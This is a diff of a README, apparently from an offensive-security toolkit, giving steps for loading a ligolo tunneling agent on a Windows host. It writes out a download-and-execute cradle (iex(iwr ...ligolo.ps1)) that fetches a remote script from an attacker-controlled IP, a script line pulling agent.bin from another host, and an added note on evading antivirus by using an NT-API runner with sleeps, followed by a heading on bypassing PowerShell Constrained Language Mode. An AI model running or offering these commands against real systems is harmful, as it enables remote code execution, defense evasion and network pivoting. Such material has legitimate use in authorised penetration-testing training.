@@ -9,11 +9,12 @@
 - Powershell: `[Environment]::Is64BitProcess`
 - CMD: `set p` (Should show `PROCESSOR_ARCHITECTURE=AMD64`)
 
-3. Inside `ligolo.ps1`, make sure to update line 14 (`$url = "http://192.168.45.168/agent.bin"`) to point to your machine IP address before invoking it.
+3. Inside `ligolo.ps1`, make sure to update line 14 (`$url = "http://192.168.45.168/agent.bin"`) to point to your machine IP address before invoking it.<br>
+  NOTE: if this script is caught by AV, use the `ligolo-psrunner.ps1` as alternative as it uses NT APIs only with sleeps between sensitive operations.
 
-4. make sure both `ligolo.ps1` and `agent.bin` in the same directory, then serve them by simply using python server.
+5. make sure both `ligolo.ps1` and `agent.bin` in the same directory, then serve them by simply using python server.
 
-5. Invoke the script:
+6. Invoke the script:
 - `iex(iwr http://192.168.45.173/ligolo.ps1 -UseBasicParsing)`
 
 ## CLM Bypass
